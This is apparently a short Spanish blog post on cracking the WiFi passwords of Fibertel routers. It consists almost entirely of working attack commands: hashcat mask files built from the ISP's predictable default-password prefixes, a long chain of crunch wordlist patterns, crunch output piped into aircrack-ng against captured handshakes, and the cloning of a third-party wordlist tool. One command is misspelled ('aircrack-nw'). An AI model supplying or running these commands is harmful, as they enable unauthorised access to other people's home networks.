---
title: "Crackear Fibertel WiFixxx"
date: 2025-02-10T01:55:15-03:00
---
```console
004?d?d?d?d?d?d?d
014?d?d?d?d?d?d?d
```

Lo guardas como `004y014mas7.hcmask`. Despues solo resta correr `hashcat`.


```bash
hashcat -O --markov-threshold=0 -m 22000 -a 3 mi_hash.HC22000  004y014mas7.hcmask -w 4
```

#### O con crunch:
```console
crunch 9 9 -o 1 -t 004%%%%%%  && crunch 9 9 -o 2 -t 014%%%%%%  && crunch 9 9 -o 3 -t
004%%%%%%  && crunch 10 10 -o 4 -t %14%%%%%%%  && crunch 10 10 -o 5 -t 004%%%%%%%  && crunch 10 10 -o 6 -t 005%%%%%%%  && crunch 10 10 -o 7 -t 010%%%%%%%  && crunch 10 10 -o 8 -t 420%%%%%%%  && crunch 10 10 -o 9 -t 131%%%%%%%  && crunch 10 10 -o 10 -t 140%%%%%%%  && crunch 10 10 -o 11 -t 234%%%%%%%  && crunch 10 10 -o 12 -t 265%%%%%%%  && crunch 10 10 -o 13 -t 298%%%%%%%  && crunch 10 10 -o 14 -t 316%%%%%%%  && crunch 11 11 -o 15 -t 014%%%%%%%%   &&  crunch 11 11 -o 16 -t 004%%%%%%%% && crunch 11 11 -o 17 -t %%%%%%%%000 && crunch 13 13 -o 18 -t 004%%%%%%%%00 && crunch 13 13 -o 19 -t 26%%%%%%%%000 && crunch 13 13 -o 20 -t 260%%%%%%%abc && crunch 13 13 -o 21 -t 261%%%%%%%abc && crunch 13 13 -o 22 -t 262%%%%%%%abc && crunch 13 13 -o 23 -t 269%%%%%%%abc && crunch 13 13 -o 24 -t 420%%%%%%%000 && crunch 13 13 -o 25 -t 420%%%%%%%abc && crunch 13 13 -o 26 -t fibertel%%%%% && crunch 14 14 -o 27 -t 420%%%%%%%wifi
```

```bash
crunch 10 10 0123456789 -t 004@@@@@@@ -s 0041000000 -e 0041050000 && crunch 10 10 0123456789 -t 014@@@@@@@ -s 0141000000 -e 0141050000
```

* -s = Comienzo en... X. (Specifies a starting string, eg: 0041000000)
* -e = Termino en... X. (Specifies when crunch should stop early)

#### Ejecutar crunch sin guardarlo en el HDD
crunch 9 9 0123456789 -t %%%%%%%%% | aircrack-ng /root/Desktop/fiber-02.cap -e Fibertel -w -

#### Sin descargar el diccionario:
```bash
crunch 10 10 0123456789 -t 004@@@@@@@ -s 0041000000 -e 0044500000 | aircrack-ng file-*.cap -e (SSID) -w -

crunch 10 10 0123456789 -t 014@@@@@@@ -s 0141000000 -e 0144500000 | aircrack-ng file-*.cap -e (SSID) -w -
```


```bash
git clone https://github.com/1arlz/fiberRockl
cd fiberRockl
python main.py
aircrack-nw -w fibertel.txt handshake.cap
```
